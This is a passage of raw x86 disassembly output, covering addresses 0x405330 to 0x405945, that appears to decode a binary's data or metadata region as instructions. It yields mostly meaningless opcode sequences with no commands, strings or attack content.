  405330:	07                   	pop    %es
  405331:	03 06                	add    (%esi),%eax
  405333:	00 d2                	add    %dl,%dl
  405335:	16                   	push   %ss
  405336:	b5 16                	mov    $0x16,%ch
  405338:	06                   	push   %es
  405339:	00 e2                	add    %ah,%dl
  40533b:	16                   	push   %ss
  40533c:	b5 16                	mov    $0x16,%ch
  40533e:	06                   	push   %es
  40533f:	00 f3                	add    %dh,%bl
  405341:	16                   	push   %ss
  405342:	b5 16                	mov    $0x16,%ch
  405344:	06                   	push   %es
  405345:	00 0c 17             	add    %cl,(%edi,%edx,1)
  405348:	b5 16                	mov    $0x16,%ch
  40534a:	06                   	push   %es
  40534b:	00 26                	add    %ah,(%esi)
  40534d:	17                   	pop    %ss
  40534e:	46                   	inc    %esi
  40534f:	01 06                	add    %eax,(%esi)
  405351:	00 31                	add    %dh,(%ecx)
  405353:	17                   	pop    %ss
  405354:	b5 16                	mov    $0x16,%ch
  405356:	06                   	push   %es
  405357:	00 4c 17 b5          	add    %cl,-0x4b(%edi,%edx,1)
  40535b:	16                   	push   %ss
  40535c:	0e                   	push   %cs
  40535d:	00 96 17 37 08 0e    	add    %dl,0xe083717(%esi)
  405363:	00 c0                	add    %al,%al
  405365:	17                   	pop    %ss
  405366:	46                   	inc    %esi
  405367:	01 0e                	add    %ecx,(%esi)
  405369:	00 c4                	add    %al,%ah
  40536b:	17                   	pop    %ss
  40536c:	46                   	inc    %esi
  40536d:	01 06                	add    %eax,(%esi)
  40536f:	00 ec                	add    %ch,%ah
  405371:	17                   	pop    %ss
  405372:	81 09 06 00 46 18    	orl    $0x18460006,(%ecx)
  405378:	07                   	pop    %es
  405379:	03 06                	add    (%esi),%eax
  40537b:	00 5e 18             	add    %bl,0x18(%esi)
  40537e:	46                   	inc    %esi
  40537f:	01 06                	add    %eax,(%esi)
  405381:	00 76 18             	add    %dh,0x18(%esi)
  405384:	0e                   	push   %cs
  405385:	12 06                	adc    (%esi),%al
  405387:	00 8b 18 0e 12 06    	add    %cl,0x6120e18(%ebx)
  40538d:	00 b3 18 0e 12 06    	add    %dh,0x6120e18(%ebx)
  405393:	00 d0                	add    %dl,%al
  405395:	18 46 01             	sbb    %al,0x1(%esi)
  405398:	0e                   	push   %cs
  405399:	00 f3                	add    %dh,%bl
  40539b:	18 dd                	sbb    %bl,%ch
  40539d:	18 0e                	sbb    %cl,(%esi)
  40539f:	00 fe                	add    %bh,%dh
  4053a1:	18 dd                	sbb    %bl,%ch
  4053a3:	18 06                	sbb    %al,(%esi)
  4053a5:	00 50 19             	add    %dl,0x19(%eax)
  4053a8:	81 09 06 00 66 19    	orl    $0x19660006,(%ecx)
  4053ae:	81 09 06 00 71 19    	orl    $0x19710006,(%ecx)
  4053b4:	eb 08                	jmp    0x4053be
  4053b6:	06                   	push   %es
  4053b7:	00 91 19 eb 08 06    	add    %dl,0x608eb19(%ecx)
  4053bd:	00 af 19 81 09 06    	add    %ch,0x6098119(%edi)
  4053c3:	00 bd 19 15 13 06    	add    %bh,0x6131519(%ebp)
  4053c9:	00 da                	add    %bl,%dl
  4053cb:	19 15 13 06 00 f5    	sbb    %edx,0xf5000613
  4053d1:	19 15 13 06 00 10    	sbb    %edx,0x10000613
  4053d7:	1a 15 13 06 00 29    	sbb    0x29000613,%dl
  4053dd:	1a 15 13 06 00 42    	sbb    0x42000613,%dl
  4053e3:	1a 15 13 06 00 5f    	sbb    0x5f000613,%dl
  4053e9:	1a 15 13 00 00 00    	sbb    0x13,%dl
  4053ef:	00 01                	add    %al,(%ecx)
  4053f1:	00 00                	add    %al,(%eax)
  4053f3:	00 00                	add    %al,(%eax)
  4053f5:	00 01                	add    %al,(%ecx)
  4053f7:	00 01                	add    %al,(%ecx)
  4053f9:	00 00                	add    %al,(%eax)
  4053fb:	00 00                	add    %al,(%eax)
  4053fd:	00 29                	add    %ch,(%ecx)
  4053ff:	00 37                	add    %dh,(%edi)
  405401:	00 05 00 01 00 01    	add    %al,0x1000100
  405407:	00 00                	add    %al,(%eax)
  405409:	00 00                	add    %al,(%eax)
  40540b:	00 3a                	add    %bh,(%edx)
  40540d:	00 37                	add    %dh,(%edi)
  40540f:	00 09                	add    %cl,(%ecx)
  405411:	00 01                	add    %al,(%ecx)
  405413:	00 02                	add    %al,(%edx)
  405415:	00 00                	add    %al,(%eax)
  405417:	01 10                	add    %edx,(%eax)
  405419:	00 45 00             	add    %al,0x0(%ebp)
  40541c:	37                   	aaa
  40541d:	00 0d 00 01 00 03    	add    %cl,0x3000100
  405423:	00 05 01 00 00 4f    	add    %al,0x4f000001
  405429:	00 00                	add    %al,(%eax)
  40542b:	00 0d 00 05 00 08    	add    %cl,0x8000500
  405431:	00 05 01 00 00 5d    	add    %al,0x5d000001
  405437:	00 00                	add    %al,(%eax)
  405439:	00 0d 00 05 00 0f    	add    %cl,0xf000500
  40543f:	00 01                	add    %al,(%ecx)
  405441:	00 10                	add    %dl,(%eax)
  405443:	00 78 00             	add    %bh,0x0(%eax)
  405446:	00 00                	add    %al,(%eax)
  405448:	0d 00 06 00 11       	or     $0x11000600,%eax
  40544d:	00 01                	add    %al,(%ecx)
  40544f:	00 00                	add    %al,(%eax)
  405451:	00 81 00 86 00 0d    	add    %al,0xd008600(%ecx)
  405457:	00 0f                	add    %cl,(%edi)
  405459:	00 13                	add    %dl,(%ebx)
  40545b:	00 01                	add    %al,(%ecx)
  40545d:	00 10                	add    %dl,(%eax)
  40545f:	00 8b 00 86 00 0d    	add    %cl,0xd008600(%ebx)
  405465:	00 0f                	add    %cl,(%edi)
  405467:	00 17                	add    %dl,(%edi)
  405469:	00 01                	add    %al,(%ecx)
  40546b:	00 00                	add    %al,(%eax)
  40546d:	00 98 00 86 00 0d    	add    %bl,0xd008600(%eax)
  405473:	00 1a                	add    %bl,(%edx)
  405475:	00 2c 00             	add    %ch,(%eax,%eax,1)
  405478:	01 00                	add    %eax,(%eax)
  40547a:	00 00                	add    %al,(%eax)
  40547c:	a1 00 86 00 0d       	mov    0xd008600,%eax
  405481:	00 1f                	add    %bl,(%edi)
  405483:	00 3b                	add    %bh,(%ebx)
  405485:	00 01                	add    %al,(%ecx)
  405487:	00 00                	add    %al,(%eax)
  405489:	00 ad 00 86 00 0d    	add    %ch,0xd008600(%ebp)
  40548f:	00 1f                	add    %bl,(%edi)
  405491:	00 3d 00 00 01 10    	add    %bh,0x10010000
  405497:	00 ba 00 86 00 0d    	add    %bh,0xd008600(%edx)
  40549d:	00 1f                	add    %bl,(%edi)
  40549f:	00 3f                	add    %bh,(%edi)
  4054a1:	00 0a                	add    %cl,(%edx)
  4054a3:	01 00                	add    %eax,(%eax)
  4054a5:	00 c1                	add    %al,%cl
  4054a7:	00 00                	add    %al,(%eax)
  4054a9:	00 41 00             	add    %al,0x0(%ecx)
  4054ac:	2b 00                	sub    (%eax),%eax
  4054ae:	57                   	push   %edi
  4054af:	00 02                	add    %al,(%edx)
  4054b1:	01 00                	add    %eax,(%eax)
  4054b3:	00 cf                	add    %cl,%bh
  4054b5:	00 00                	add    %al,(%eax)
  4054b7:	00 45 00             	add    %al,0x0(%ebp)
  4054ba:	2d 00 57 00 00       	sub    $0x5700,%eax
  4054bf:	01 00                	add    %eax,(%eax)
  4054c1:	00 fb                	add    %bh,%bl
  4054c3:	09 00                	or     %eax,(%eax)
  4054c5:	00 85 00 31 00 57    	add    %al,0x57003100(%ebp)
  4054cb:	00 05 00 00 00 e5    	add    %al,0xe5000000
  4054d1:	0f 00 00             	sldt   (%eax)
  4054d4:	0d 00 31 00 5b       	or     $0x5b003100,%eax
  4054d9:	00 31                	add    %dh,(%ecx)
  4054db:	00 68 01             	add    %ch,0x1(%eax)
  4054de:	20 00                	and    %al,(%eax)
  4054e0:	31 00                	xor    %eax,(%eax)
  4054e2:	91                   	xchg   %eax,%ecx
  4054e3:	01 2d 00 31 00 b3    	add    %ebp,0xb3003100
  4054e9:	01 3a                	add    %edi,(%edx)
  4054eb:	00 31                	add    %dh,(%ecx)
  4054ed:	00 d8                	add    %bl,%al
  4054ef:	01 47 00             	add    %eax,0x0(%edi)
  4054f2:	11 00                	adc    %eax,(%eax)
  4054f4:	7b 02                	jnp    0x4054f8
  4054f6:	90                   	nop
  4054f7:	00 16                	add    %dl,(%esi)
  4054f9:	00 9b 02 99 00 16    	add    %bl,0x16009902(%ebx)
  4054ff:	00 a1 02 99 00 16    	add    %ah,0x16009902(%ecx)
  405505:	00 a6 02 99 00 16    	add    %ah,0x16009902(%esi)
  40550b:	00 ab 02 99 00 16    	add    %ch,0x16009902(%ebx)
  405511:	00 af 02 99 00 16    	add    %ch,0x16009902(%edi)
  405517:	00 b3 02 9c 00 16    	add    %dh,0x16009c02(%ebx)
  40551d:	00 b9 02 99 00 16    	add    %bh,0x16009902(%ecx)
  405523:	00 bf 02 99 00 16    	add    %bh,0x16009902(%edi)
  405529:	00 c5                	add    %al,%ch
  40552b:	02 99 00 16 00 cb    	add    -0x34ffea00(%ecx),%bl
  405531:	02 9f 00 16 00 f1    	add    -0xeffea00(%edi),%bl
  405537:	02 a2 00 11 00 f3    	add    -0xcffef00(%edx),%ah
  40553d:	02 a6 00 11 00 00    	add    0x1100(%esi),%ah
  405543:	03 a9 00 11 00 1e    	add    0x1e001100(%ecx),%ebp
  405549:	03 ad 00 11 00 38    	add    0x38001100(%ebp),%ebp
  40554f:	03 b1 00 16 00 4e    	add    0x4e001600(%ecx),%esi
  405555:	03 b5 00 11 00 56    	add    0x56001100(%ebp),%esi
  40555b:	03 b9 00 16 00 5f    	add    0x5f001600(%ecx),%edi
  405561:	03 b1 00 16 00 65    	add    0x65001600(%ecx),%esi
  405567:	03 9c 00 16 00 6e 03 	add    0x36e0016(%eax,%eax,1),%ebx
  40556e:	9f                   	lahf
  40556f:	00 16                	add    %dl,(%esi)
  405571:	00 1c 04             	add    %bl,(%esp,%eax,1)
  405574:	df 00                	filds  (%eax)
  405576:	16                   	push   %ss
  405577:	00 26                	add    %ah,(%esi)
  405579:	04 9c                	add    $0x9c,%al
  40557b:	00 16                	add    %dl,(%esi)
  40557d:	00 4b 04             	add    %cl,0x4(%ebx)
  405580:	e3 00                	jecxz  0x405582
  405582:	16                   	push   %ss
  405583:	00 50 04             	add    %dl,0x4(%eax)
  405586:	e3 00                	jecxz  0x405588
  405588:	16                   	push   %ss
  405589:	00 da                	add    %bl,%dl
  40558b:	04 f9                	add    $0xf9,%al
  40558d:	00 16                	add    %dl,(%esi)
  40558f:	00 63 05             	add    %ah,0x5(%ebx)
  405592:	9f                   	lahf
  405593:	00 51 80             	add    %dl,-0x80(%ecx)
  405596:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405597:	05 99 00 16 00       	add    $0x160099,%eax
  40559c:	af                   	scas   %es:(%edi),%eax
  40559d:	05 5f 01 36 00       	add    $0x36015f,%eax
  4055a2:	b6 05                	mov    $0x5,%dh
  4055a4:	99                   	cltd
  4055a5:	00 16                	add    %dl,(%esi)
  4055a7:	00 b9 05 99 00 11    	add    %bh,0x11009905(%ecx)
  4055ad:	00 ee                	add    %ch,%dh
  4055af:	05 9c 00 11 00       	add    $0x11009c,%eax
  4055b4:	f7 05 6f 01 16 00 1e 	testl  $0x177061e,0x16016f
  4055bb:	06 77 01 
  4055be:	16                   	push   %ss
  4055bf:	00 2c 06             	add    %ch,(%esi,%eax,1)
  4055c2:	9c                   	pushf
  4055c3:	00 16                	add    %dl,(%esi)
  4055c5:	00 3d 06 99 00 16    	add    %bh,0x16009906
  4055cb:	00 4a 06             	add    %cl,0x6(%edx)
  4055ce:	df 00                	filds  (%eax)
  4055d0:	16                   	push   %ss
  4055d1:	00 49 07             	add    %cl,0x7(%ecx)
  4055d4:	ad                   	lods   %ds:(%esi),%eax
  4055d5:	01 06                	add    %eax,(%esi)
  4055d7:	10 74 07 9c          	adc    %dh,-0x64(%edi,%eax,1)
  4055db:	00 06                	add    %al,(%esi)
  4055dd:	10 7b 07             	adc    %bh,0x7(%ebx)
  4055e0:	9c                   	pushf
  4055e1:	00 06                	add    %al,(%esi)
  4055e3:	06                   	push   %es
  4055e4:	87 07                	xchg   %eax,(%edi)
  4055e6:	b1 01                	mov    $0x1,%cl
  4055e8:	56                   	push   %esi
  4055e9:	80 8f 07 b4 01 56 80 	orb    $0x80,0x5601b407(%edi)
  4055f0:	9d                   	popf
  4055f1:	07                   	pop    %es
  4055f2:	b4 01                	mov    $0x1,%ah
  4055f4:	56                   	push   %esi
  4055f5:	80 b1 07 b4 01 06 00 	xorb   $0x0,0x601b407(%ecx)
  4055fc:	f2 0f 99 00          	repnz setns (%eax)
  405600:	06                   	push   %es
  405601:	00 01                	add    %al,(%ecx)
  405603:	10 99 00 50 20 00    	adc    %bl,0x205000(%ecx)
  405609:	00 00                	add    %al,(%eax)
  40560b:	00 06                	add    %al,(%esi)
  40560d:	18 19                	sbb    %bl,(%ecx)
  40560f:	01 13                	add    %edx,(%ebx)
  405611:	00 01                	add    %al,(%ecx)
  405613:	00 58 20             	add    %bl,0x20(%eax)
  405616:	00 00                	add    %al,(%eax)
  405618:	00 00                	add    %al,(%eax)
  40561a:	06                   	push   %es
  40561b:	18 19                	sbb    %bl,(%ecx)
  40561d:	01 13                	add    %edx,(%ebx)
  40561f:	00 01                	add    %al,(%ecx)
  405621:	00 60 20             	add    %ah,0x20(%eax)
  405624:	00 00                	add    %al,(%eax)
  405626:	00 00                	add    %al,(%eax)
  405628:	11 18                	adc    %ebx,(%eax)
  40562a:	54                   	push   %esp
  40562b:	01 17                	add    %edx,(%edi)
  40562d:	00 01                	add    %al,(%ecx)
  40562f:	00 8c 20 00 00 00 00 	add    %cl,0x0(%eax,%eiz,1)
  405636:	13 08                	adc    (%eax),%ecx
  405638:	5b                   	pop    %ebx
  405639:	01 1b                	add    %ebx,(%ebx)
  40563b:	00 01                	add    %al,(%ecx)
  40563d:	00 a8 20 00 00 00    	add    %ch,0x20(%eax)
  405643:	00 13                	add    %dl,(%ebx)
  405645:	08 81 01 28 00 01    	or     %al,0x1002801(%ecx)
  40564b:	00 c4                	add    %al,%ah
  40564d:	20 00                	and    %al,(%eax)
  40564f:	00 00                	add    %al,(%eax)
  405651:	00 13                	add    %dl,(%ebx)
  405653:	08 aa 01 35 00 01    	or     %ch,0x1003501(%edx)
  405659:	00 e0                	add    %ah,%al
  40565b:	20 00                	and    %al,(%eax)
  40565d:	00 00                	add    %al,(%eax)
  40565f:	00 13                	add    %dl,(%ebx)
  405661:	08 c8                	or     %cl,%al
  405663:	01 42 00             	add    %eax,0x0(%edx)
  405666:	01 00                	add    %eax,(%eax)
  405668:	fc                   	cld
  405669:	20 00                	and    %al,(%eax)
  40566b:	00 00                	add    %al,(%eax)
  40566d:	00 46 02             	add    %al,0x2(%esi)
  405670:	0e                   	push   %cs
  405671:	02 63 00             	add    0x0(%ebx),%ah
  405674:	01 00                	add    %eax,(%eax)
  405676:	1c 21                	sbb    $0x21,%al
  405678:	00 00                	add    %al,(%eax)
  40567a:	00 00                	add    %al,(%eax)
  40567c:	46                   	inc    %esi
  40567d:	02 17                	add    (%edi),%dl
  40567f:	02 68 00             	add    0x0(%eax),%ch
  405682:	02 00                	add    (%eax),%al
  405684:	34 21                	xor    $0x21,%al
  405686:	00 00                	add    %al,(%eax)
  405688:	00 00                	add    %al,(%eax)
  40568a:	83 00 28             	addl   $0x28,(%eax)
  40568d:	02 6c 00 02          	add    0x2(%eax,%eax,1),%ch
  405691:	00 50 21             	add    %dl,0x21(%eax)
  405694:	00 00                	add    %al,(%eax)
  405696:	00 00                	add    %al,(%eax)
  405698:	46                   	inc    %esi
  405699:	02 30                	add    (%eax),%dh
  40569b:	02 71 00             	add    0x0(%ecx),%dh
  40569e:	02 00                	add    (%eax),%al
  4056a0:	68 21 00 00 00       	push   $0x21
  4056a5:	00 11                	add    %dl,(%ecx)
  4056a7:	00 39                	add    %bh,(%ecx)
  4056a9:	02 78 00             	add    0x0(%eax),%bh
  4056ac:	02 00                	add    (%eax),%al
  4056ae:	8c 21                	mov    %fs,(%ecx)
  4056b0:	00 00                	add    %al,(%eax)
  4056b2:	00 00                	add    %al,(%eax)
  4056b4:	01 00                	add    %eax,(%eax)
  4056b6:	57                   	push   %edi
  4056b7:	02 80 00 03 00 a8    	add    -0x57fffd00(%eax),%al
  4056bd:	21 00                	and    %eax,(%eax)
  4056bf:	00 00                	add    %al,(%eax)
  4056c1:	00 06                	add    %al,(%esi)
  4056c3:	18 19                	sbb    %bl,(%ecx)
  4056c5:	01 13                	add    %edx,(%ebx)
  4056c7:	00 04 00             	add    %al,(%eax,%eax,1)
  4056ca:	b0 21                	mov    $0x21,%al
  4056cc:	00 00                	add    %al,(%eax)
  4056ce:	00 00                	add    %al,(%eax)
  4056d0:	03 08                	add    (%eax),%ecx
  4056d2:	6b 02 8b             	imul   $0xffffff8b,(%edx),%eax
  4056d5:	00 04 00             	add    %al,(%eax,%eax,1)
  4056d8:	dc 21                	fsubl  (%ecx)
  4056da:	00 00                	add    %al,(%eax)
  4056dc:	00 00                	add    %al,(%eax)
  4056de:	06                   	push   %es
  4056df:	18 19                	sbb    %bl,(%ecx)
  4056e1:	01 13                	add    %edx,(%ebx)
  4056e3:	00 04 00             	add    %al,(%eax,%eax,1)
  4056e6:	e4 21                	in     $0x21,%al
  4056e8:	00 00                	add    %al,(%eax)
  4056ea:	00 00                	add    %al,(%eax)
  4056ec:	11 18                	adc    %ebx,(%eax)
  4056ee:	54                   	push   %esp
  4056ef:	01 17                	add    %edx,(%edi)
  4056f1:	00 04 00             	add    %al,(%eax,%eax,1)
  4056f4:	48                   	dec    %eax
  4056f5:	22 00                	and    (%eax),%al
  4056f7:	00 00                	add    %al,(%eax)
  4056f9:	00 06                	add    %al,(%esi)
  4056fb:	18 19                	sbb    %bl,(%ecx)
  4056fd:	01 13                	add    %edx,(%ebx)
  4056ff:	00 04 00             	add    %al,(%eax,%eax,1)
  405702:	50                   	push   %eax
  405703:	22 00                	and    (%eax),%al
  405705:	00 00                	add    %al,(%eax)
  405707:	00 06                	add    %al,(%esi)
  405709:	18 19                	sbb    %bl,(%ecx)
  40570b:	01 13                	add    %edx,(%ebx)
  40570d:	00 04 00             	add    %al,(%eax,%eax,1)
  405710:	58                   	pop    %eax
  405711:	22 00                	and    (%eax),%al
  405713:	00 00                	add    %al,(%eax)
  405715:	00 16                	add    %dl,(%esi)
  405717:	00 81 00 17 00 04    	add    %al,0x4001700(%ecx)
  40571d:	00 5c 23 00          	add    %bl,0x0(%ebx,%eiz,1)
  405721:	00 00                	add    %al,(%eax)
  405723:	00 11                	add    %dl,(%ecx)
  405725:	08 a1 0a 17 00 04    	or     %ah,0x400170a(%ecx)
  40572b:	00 68 23             	add    %ch,0x23(%eax)
  40572e:	00 00                	add    %al,(%eax)
  405730:	00 00                	add    %al,(%eax)
  405732:	11 08                	adc    %ecx,(%eax)
  405734:	ad                   	lods   %ds:(%esi),%eax
  405735:	0a 17                	or     (%edi),%dl
  405737:	00 04 00             	add    %al,(%eax,%eax,1)
  40573a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40573b:	23 00                	and    (%eax),%eax
  40573d:	00 00                	add    %al,(%eax)
  40573f:	00 11                	add    %dl,(%ecx)
  405741:	18 54 01 17          	sbb    %dl,0x17(%ecx,%eax,1)
  405745:	00 04 00             	add    %al,(%eax,%eax,1)
  405748:	d8 23                	fsubs  (%ebx)
  40574a:	00 00                	add    %al,(%eax)
  40574c:	00 00                	add    %al,(%eax)
  40574e:	06                   	push   %es
  40574f:	18 19                	sbb    %bl,(%ecx)
  405751:	01 13                	add    %edx,(%ebx)
  405753:	00 04 00             	add    %al,(%eax,%eax,1)
  405756:	e0 23                	loopne 0x40577b
  405758:	00 00                	add    %al,(%eax)
  40575a:	00 00                	add    %al,(%eax)
  40575c:	16                   	push   %ss
  40575d:	00 7b 03             	add    %bh,0x3(%ebx)
  405760:	17                   	pop    %ss
  405761:	00 04 00             	add    %al,(%eax,%eax,1)
  405764:	b4 24                	mov    $0x24,%ah
  405766:	00 00                	add    %al,(%eax)
  405768:	00 00                	add    %al,(%eax)
  40576a:	16                   	push   %ss
  40576b:	00 88 03 bc 00 04    	add    %cl,0x400bc03(%eax)
  405771:	00 24 26             	add    %ah,(%esi,%eiz,1)
  405774:	00 00                	add    %al,(%eax)
  405776:	00 00                	add    %al,(%eax)
  405778:	16                   	push   %ss
  405779:	00 98 03 c1 00 05    	add    %bl,0x500c103(%eax)
  40577f:	00 88 27 00 00 00    	add    %cl,0x27(%eax)
  405785:	00 16                	add    %dl,(%esi)
  405787:	00 9d 03 c5 00 05    	add    %bl,0x500c503(%ebp)
  40578d:	00 e4                	add    %ah,%ah
  40578f:	27                   	daa
  405790:	00 00                	add    %al,(%eax)
  405792:	00 00                	add    %al,(%eax)
  405794:	16                   	push   %ss
  405795:	00 a4 03 c5 00 05 00 	add    %ah,0x500c5(%ebx,%eax,1)
  40579c:	4c                   	dec    %esp
  40579d:	28 00                	sub    %al,(%eax)
  40579f:	00 00                	add    %al,(%eax)
  4057a1:	00 16                	add    %dl,(%esi)
  4057a3:	00 ab 03 c5 00 05    	add    %ch,0x500c503(%ebx)
  4057a9:	00 a8 28 00 00 00    	add    %ch,0x28(%eax)
  4057af:	00 16                	add    %dl,(%esi)
  4057b1:	00 af 03 c5 00 05    	add    %ch,0x500c503(%edi)
  4057b7:	00 ac 29 00 00 00 00 	add    %ch,0x0(%ecx,%ebp,1)
  4057be:	16                   	push   %ss
  4057bf:	00 b9 03 c5 00 05    	add    %bh,0x500c503(%ecx)
  4057c5:	00 64 2a 00          	add    %ah,0x0(%edx,%ebp,1)
  4057c9:	00 00                	add    %al,(%eax)
  4057cb:	00 16                	add    %dl,(%esi)
  4057cd:	00 bd 03 c5 00 05    	add    %bh,0x500c503(%ebp)
  4057d3:	00 04 2b             	add    %al,(%ebx,%ebp,1)
  4057d6:	00 00                	add    %al,(%eax)
  4057d8:	00 00                	add    %al,(%eax)
  4057da:	16                   	push   %ss
  4057db:	00 c1                	add    %al,%cl
  4057dd:	03 c5                	add    %ebp,%eax
  4057df:	00 05 00 dc 2b 00    	add    %al,0x2bdc00
  4057e5:	00 00                	add    %al,(%eax)
  4057e7:	00 16                	add    %dl,(%esi)
  4057e9:	00 d2                	add    %dl,%dl
  4057eb:	03 c9                	add    %ecx,%ecx
  4057ed:	00 05 00 cc 2d 00    	add    %al,0x2dcc00
  4057f3:	00 00                	add    %al,(%eax)
  4057f5:	00 16                	add    %dl,(%esi)
  4057f7:	00 e2                	add    %ah,%dl
  4057f9:	03 cf                	add    %edi,%ecx
  4057fb:	00 06                	add    %al,(%esi)
  4057fd:	00 00                	add    %al,(%eax)
  4057ff:	2e 00 00             	add    %al,%cs:(%eax)
  405802:	00 00                	add    %al,(%eax)
  405804:	16                   	push   %ss
  405805:	00 ee                	add    %ch,%dh
  405807:	03 d5                	add    %ebp,%edx
  405809:	00 07                	add    %al,(%edi)
  40580b:	00 00                	add    %al,(%eax)
  40580d:	2f                   	das
  40580e:	00 00                	add    %al,(%eax)
  405810:	00 00                	add    %al,(%eax)
  405812:	16                   	push   %ss
  405813:	00 f7                	add    %dh,%bh
  405815:	03 c9                	add    %ecx,%ecx
  405817:	00 08                	add    %cl,(%eax)
  405819:	00 40 2f             	add    %al,0x2f(%eax)
  40581c:	00 00                	add    %al,(%eax)
  40581e:	00 00                	add    %al,(%eax)
  405820:	16                   	push   %ss
  405821:	00 ff                	add    %bh,%bh
  405823:	03 17                	add    (%edi),%edx
  405825:	00 09                	add    %cl,(%ecx)
  405827:	00 38                	add    %bh,(%eax)
  405829:	30 00                	xor    %al,(%eax)
  40582b:	00 00                	add    %al,(%eax)
  40582d:	00 16                	add    %dl,(%esi)
  40582f:	00 0e                	add    %cl,(%esi)
  405831:	04 da                	add    $0xda,%al
  405833:	00 09                	add    %cl,(%ecx)
  405835:	00 80 30 00 00 00    	add    %al,0x30(%eax)
  40583b:	00 16                	add    %dl,(%esi)
  40583d:	00 17                	add    %dl,(%edi)
  40583f:	04 17                	add    $0x17,%al
  405841:	00 0a                	add    %cl,(%edx)
  405843:	00 fc                	add    %bh,%ah
  405845:	30 00                	xor    %al,(%eax)
  405847:	00 00                	add    %al,(%eax)
  405849:	00 11                	add    %dl,(%ecx)
  40584b:	08 7a 0b             	or     %bh,0xb(%edx)
  40584e:	da 00                	fiaddl (%eax)
  405850:	0a 00                	or     (%eax),%al
  405852:	08 31                	or     %dh,(%ecx)
  405854:	00 00                	add    %al,(%eax)
  405856:	00 00                	add    %al,(%eax)
  405858:	11 08                	adc    %ecx,(%eax)
  40585a:	89 0b                	mov    %ecx,(%ebx)
  40585c:	da 00                	fiaddl (%eax)
  40585e:	0b 00                	or     (%eax),%eax
  405860:	18 31                	sbb    %dh,(%ecx)
  405862:	00 00                	add    %al,(%eax)
  405864:	00 00                	add    %al,(%eax)
  405866:	06                   	push   %es
  405867:	18 19                	sbb    %bl,(%ecx)
  405869:	01 13                	add    %edx,(%ebx)
  40586b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40586e:	20 31                	and    %dh,(%ecx)
  405870:	00 00                	add    %al,(%eax)
  405872:	00 00                	add    %al,(%eax)
  405874:	16                   	push   %ss
  405875:	00 21                	add    %ah,(%ecx)
  405877:	04 cf                	add    $0xcf,%al
  405879:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40587c:	ac                   	lods   %ds:(%esi),%al
  40587d:	39 00                	cmp    %eax,(%eax)
  40587f:	00 00                	add    %al,(%eax)
  405881:	00 16                	add    %dl,(%esi)
  405883:	00 29                	add    %ch,(%ecx)
  405885:	04 cf                	add    $0xcf,%al
  405887:	00 0d 00 88 3e 00    	add    %cl,0x3e8800
  40588d:	00 00                	add    %al,(%eax)
  40588f:	00 16                	add    %dl,(%esi)
  405891:	00 32                	add    %dh,(%edx)
  405893:	04 d5                	add    $0xd5,%al
  405895:	00 0e                	add    %cl,(%esi)
  405897:	00 cc                	add    %cl,%ah
  405899:	3e 00 00             	add    %al,%ds:(%eax)
  40589c:	00 00                	add    %al,(%eax)
  40589e:	16                   	push   %ss
  40589f:	00 3a                	add    %bh,(%edx)
  4058a1:	04 d5                	add    $0xd5,%al
  4058a3:	00 0f                	add    %cl,(%edi)
  4058a5:	00 10                	add    %dl,(%eax)
  4058a7:	3f                   	aas
  4058a8:	00 00                	add    %al,(%eax)
  4058aa:	00 00                	add    %al,(%eax)
  4058ac:	16                   	push   %ss
  4058ad:	00 5d 04             	add    %bl,0x4(%ebp)
  4058b0:	d5 00                	aad    $0x0
  4058b2:	10 00                	adc    %al,(%eax)
  4058b4:	00 40 00             	add    %al,0x0(%eax)
  4058b7:	00 00                	add    %al,(%eax)
  4058b9:	00 16                	add    %dl,(%esi)
  4058bb:	00 66 04             	add    %ah,0x4(%esi)
  4058be:	d5 00                	aad    $0x0
  4058c0:	11 00                	adc    %eax,(%eax)
  4058c2:	f0 40                	lock inc %eax
  4058c4:	00 00                	add    %al,(%eax)
  4058c6:	00 00                	add    %al,(%eax)
  4058c8:	16                   	push   %ss
  4058c9:	00 76 04             	add    %dh,0x4(%esi)
  4058cc:	e7 00                	out    %eax,$0x0
  4058ce:	12 00                	adc    (%eax),%al
  4058d0:	00 00                	add    %al,(%eax)
  4058d2:	00 00                	add    %al,(%eax)
  4058d4:	80 00 16             	addb   $0x16,(%eax)
  4058d7:	20 89 04 ed 00 14    	and    %cl,0x1400ed04(%ecx)
  4058dd:	00 00                	add    %al,(%eax)
  4058df:	00 00                	add    %al,(%eax)
  4058e1:	00 80 00 16 20 e1    	add    %al,-0x1edfea00(%eax)
  4058e7:	04 fc                	add    $0xfc,%al
  4058e9:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4058ec:	b0 41                	mov    $0x41,%al
  4058ee:	00 00                	add    %al,(%eax)
  4058f0:	00 00                	add    %al,(%eax)
  4058f2:	16                   	push   %ss
  4058f3:	00 20                	add    %ah,(%eax)
  4058f5:	05 07 01 21 00       	add    $0x210107,%eax
  4058fa:	0c 42                	or     $0x42,%al
  4058fc:	00 00                	add    %al,(%eax)
  4058fe:	00 00                	add    %al,(%eax)
  405900:	11 00                	adc    %eax,(%eax)
  405902:	24 05                	and    $0x5,%al
  405904:	0b 01                	or     (%ecx),%eax
  405906:	21 00                	and    %eax,(%eax)
  405908:	e0 42                	loopne 0x40594c
  40590a:	00 00                	add    %al,(%eax)
  40590c:	00 00                	add    %al,(%eax)
  40590e:	11 00                	adc    %eax,(%eax)
  405910:	36 05 12 01 23 00    	ss add $0x230112,%eax
  405916:	5c                   	pop    %esp
  405917:	43                   	inc    %ebx
  405918:	00 00                	add    %al,(%eax)
  40591a:	00 00                	add    %al,(%eax)
  40591c:	11 08                	adc    %ecx,(%eax)
  40591e:	1c 10                	sbb    $0x10,%al
  405920:	da 00                	fiaddl (%eax)
  405922:	24 00                	and    $0x0,%al
  405924:	6c                   	insb   (%dx),%es:(%edi)
  405925:	43                   	inc    %ebx
  405926:	00 00                	add    %al,(%eax)
  405928:	00 00                	add    %al,(%eax)
  40592a:	11 08                	adc    %ecx,(%eax)
  40592c:	28 10                	sub    %dl,(%eax)
  40592e:	da 00                	fiaddl (%eax)
  405930:	25 00 4c 44 00       	and    $0x444c00,%eax
  405935:	00 00                	add    %al,(%eax)
  405937:	00 06                	add    %al,(%esi)
  405939:	18 19                	sbb    %bl,(%ecx)
  40593b:	01 13                	add    %edx,(%ebx)
  40593d:	00 26                	add    %ah,(%esi)
  40593f:	00 54 44 00          	add    %dl,0x0(%esp,%eax,2)
  405943:	00 00                	add    %al,(%eax)
  405945:	00 16                	add    %dl,(%esi)
